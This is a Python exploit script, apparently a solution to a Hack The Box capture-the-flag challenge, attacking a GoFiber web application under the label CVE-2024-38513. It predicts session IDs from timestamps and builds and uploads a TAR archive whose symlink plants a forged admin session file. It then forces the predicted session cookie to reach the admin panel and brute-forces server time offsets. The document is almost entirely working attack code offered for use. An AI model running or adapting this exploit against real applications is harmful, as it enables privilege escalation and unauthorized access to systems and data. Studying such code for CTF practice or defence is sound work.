import requests
import tarfile
import json
import time
import io
import os
import re
import argparse
import hashlib
from urllib.parse import urljoin

class GoFiberSessionFixationExploit:
    def __init__(self, target_url="http://localhost:1337", time_offset=0.0, delay=2.0):
        self.target_url = target_url
        self.time_offset = float(time_offset)
        self.delay = float(delay)
        
        # Nuevo: Guardar el timestamp inicial del servidor
        self.initial_server_time = self.get_server_time()  # Función nueva añadida
        
        self.username = f"attacker_{int(time.time())}"
        self.password = "password123"
        self.session = requests.Session()
        self.predicted_session_id = self.generate_predicted_session_id()
        
    def get_server_time(self):
        """Obtiene el timestamp del servidor usando el offset."""
        return time.time() + self.time_offset  # Simula el tiempo del servidor
    
    def generate_predicted_session_id(self):
        """Genera el session_id usando el tiempo del servidor."""
        future_timestamp = int(self.initial_server_time) + int(self.delay)
        session_id = hashlib.sha256(str(future_timestamp).encode()).hexdigest()
        print(f"[*] Predicted session ID (delay={self.delay}s): {session_id}")
        print(f"[*] Based on server timestamp: {future_timestamp}")
        return session_id

    def register_user(self):
        """Register a new user in the application"""
        url = urljoin(self.target_url, "/register")
        data = {"username": self.username, "password": self.password}
        
        try:
            response = self.session.post(url, json=data)
            if response.status_code in [200, 201, 302]:
                print(f"[+] Successfully registered user: {self.username}")
                return True
            else:
                print(f"[-] Failed to register user. Status: {response.status_code}")
                print(f"[-] Response: {response.text[:200]}")  # Show part of the response for debugging
                return False
        except Exception as e:
            print(f"[-] Error during registration: {str(e)}")
            return False

    def login_user(self):
        """Login and establish a session"""
        url = urljoin(self.target_url, "/login")
        data = {"username": self.username, "password": self.password}
        
        try:
            response = self.session.post(url, json=data)
            if response.status_code in [200, 302]:
                print("[+] Successfully logged in.")
                print(f"[*] Cookies: {self.session.cookies.get_dict()}")
                return True
            else:
                print(f"[-] Login failed. Status: {response.status_code}")
                print(f"[-] Response: {response.text[:200]}")
                return False
        except Exception as e:
            print(f"[-] Error during login: {str(e)}")
            return False
            
    def login_user_wrong(self):
        """Attempt login with incorrect credentials to force loading of the injected session."""
        url = urljoin(self.target_url, "/login")
        data = {"username": self.username, "password": "wrong"}
        
        # Force using the predicted session ID
        self.session.cookies.set("session", self.predicted_session_id)
        
        # Debug: Print request details
        print(f"[*] Attempting failed login at: {url}")
        print(f"[*] Sending data: {data}")
        print(f"[*] Cookies being sent: {self.session.cookies.get_dict()}")
        
        try:
            response = self.session.post(url, json=data)
            
            # Debug: Print response details
            print(f"[*] Response status code: {response.status_code}")
            print(f"[*] Response content: {response.text[:200]}")  # Limit output length
            
            # Check that the status code is not 200 (success) or 302 (redirect)
            if response.status_code not in [200, 302]:
                print(f"[-] Login failed as expected. Status: {response.status_code}")
                return True  # Return True because failure is expected
            else:
                print("[+] Login succeeded unexpectedly. This should not happen.")
                return False
        except Exception as e:
            print(f"[-] Error during wrong login: {str(e)}")
            return False

    def create_tar_exploit(self):
        """Create a malicious TAR file that injects a session file via symlink."""
        archive_name = "malicious.tar"
        symlink_name = "foo/duplicated.txt"
        
        # Symlink Target - Must Match Registered User's Directory
        symlink_target = f"/tmp/sessions/{self.username}/{self.predicted_session_id}"
        
        # Session payload with admin role
        json_payload = json.dumps({
            "username": self.username,
            "id": 3,
            "role": "admin"
        }, separators=(',', ':')).encode()

        try:
            with tarfile.open(archive_name, "w") as tar:
                # Ensure foo/ subdirectory exists
                dir_info = tarfile.TarInfo(name="foo/")
                dir_info.type = tarfile.DIRTYPE
                tar.addfile(dir_info)

                # Create symlink pointing to the session file location
                symlink_info = tarfile.TarInfo(name=symlink_name)
                symlink_info.type = tarfile.SYMTYPE
                symlink_info.linkname = symlink_target
                tar.addfile(symlink_info)

                # Add session payload with the same name as the symlink
                file_info = tarfile.TarInfo(name=symlink_name)
                file_info.type = tarfile.REGTYPE
                file_info.size = len(json_payload)
                file_info.mode = 0o444  # read-only for everyone
                tar.addfile(file_info, io.BytesIO(json_payload))

            print(f"[+] Created malicious TAR: {archive_name}")
            print(f"[+] Symlink target: {symlink_target}")
            return archive_name
        except Exception as e:
            print(f"[-] Error creating TAR: {str(e)}")
            return None

    def upload_tar(self, archive_name):
        """Upload the TAR archive to the server"""
        url = urljoin(self.target_url, "/user/upload")

        try:
            with open(archive_name, "rb") as f:
                files = {"archive": (archive_name, f, "application/x-tar")}
                response = self.session.post(url, files=files)

                if response.status_code in [200, 201, 202]:
                    print("[+] Successfully uploaded exploit.")
                    response_text = response.text[:200]
                    print(f"[*] Response: {response_text}")
                    return True
                else:
                    print(f"[-] Upload failed. Status: {response.status_code}")
                    print(f"[-] Response: {response.text[:200]}")
                    return False
        except Exception as e:
            print(f"[-] Error uploading TAR: {str(e)}")
            return False
        finally:
            if os.path.exists(archive_name):
                os.remove(archive_name)

    def access_admin_page(self):
        """Access the admin panel with the predicted session ID and extract the flag."""
        url = urljoin(self.target_url, "/user/admin")
        
        # Make sure cookies are set correctly
        self.session.cookies.set("session", self.predicted_session_id)
        self.session.cookies.set("username", self.username)  # Must match the registered user

        # Print cookies for debugging
        print(f"[*] Cookies before accessing /user/admin: {self.session.cookies.get_dict()}")

        try:
            response = self.session.get(url)
            if response.status_code == 200:
                # Search for the flag in the HTML content using regex
                flag_pattern = r"HTB\{.*?\}"
                match = re.search(flag_pattern, response.text)
                
                if match:
                    flag = match.group(0)
                    print(f"[+] FLAG FOUND: {flag}")
                    return True
                else:
                    print("[-] Flag not found in the response.")
                    print("Response content:")
                    print(response.text[:500])  # Print part of the content for debugging
                    return False
            else:
                print(f"[-] Failed to access admin. Status: {response.status_code}")
                print("Response excerpt:")
                print(response.text[:500])  # Print part of the response for debugging
                return False
        except Exception as e:
            print(f"[-] Error accessing admin page: {str(e)}")
            return False

    def run_exploit(self):
        """Ejecuta el exploit con sincronización del tiempo del servidor."""
        print("[*] Starting GoFiber Session Fixation Exploit")
        print(f"[*] Target: {self.target_url}")
        print(f"[*] Time offset: {self.time_offset} seconds")
        print(f"[*] Prediction delay: {self.delay} seconds")

        # Paso 1: Registrar e iniciar sesión
        if not self.register_user():
            print("[-] Registration failed, but continuing...")
        if not self.login_user():
            print("[-] Login failed, but continuing...")

        # Paso 2: Crear y subir el TAR
        archive = self.create_tar_exploit()
        if not archive or not self.upload_tar(archive):
            return False

        # Paso 3: Calcular tiempo de espera ajustado al servidor
        current_server_time = self.get_server_time()
        time_elapsed = current_server_time - self.initial_server_time
        remaining_delay = max(0, self.delay - time_elapsed)  # No esperar tiempos negativos
        
        print(f"[*] Waiting {remaining_delay:.2f}s (server time aligned)...")
        time.sleep(remaining_delay)

        # Paso 4: Login fallido sincronizado
        if not self.login_user_wrong():
            print("[-] Forced login failed, but continuing...")

        # Paso 5: Acceder al panel de administración
        return self.access_admin_page()


def brute_force_offsets(url, start_offset, end_offset, step, delay):
    """Try multiple time offsets to find the correct server time."""
    print(f"[*] Starting brute force with offsets from {start_offset} to {end_offset} (step {step})")
    
    current_offset = float(start_offset)
    while current_offset <= float(end_offset):
        print(f"\n[*] Trying offset: {current_offset} seconds")
        exploiter = GoFiberSessionFixationExploit(url, current_offset, delay)
        success = exploiter.run_exploit()
        
        # If we found the flag, we can stop
        if success:
            print(f"[+] Success with offset: {current_offset}")
            return True
        
        # Move to the next offset value
        current_offset += float(step)
        
        # Short delay between attempts
        time.sleep(1)
    
    print("[-] Brute force completed without finding the flag")
    return False


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit for GoFiber Session Fixation (CVE-2024-38513)")
    parser.add_argument("-u", "--url", default="http://localhost:1337", help="Target URL (default: http://localhost:1337)")
    parser.add_argument("-o", "--offset", type=float, default=0.0, help="Time offset in seconds, can be decimal (default: 0.0)")
    parser.add_argument("-d", "--delay", type=float, default=2.0, help="Delay for session prediction in seconds, can be decimal (default: 2.0)")
    parser.add_argument("--brute", action="store_true", help="Enable brute force mode for time offset")
    parser.add_argument("--start", type=float, default=-5.0, help="Start offset for brute force (default: -5.0)")
    parser.add_argument("--end", type=float, default=5.0, help="End offset for brute force (default: 5.0)")
    parser.add_argument("--step", type=float, default=0.5, help="Step size for brute force, can be decimal (default: 0.5)")
    args = parser.parse_args()
    
    if args.brute:
        brute_force_offsets(args.url, args.start, args.end, args.step, args.delay)
    else:
        exploiter = GoFiberSessionFixationExploit(args.url, args.offset, args.delay)
        exploiter.run_exploit()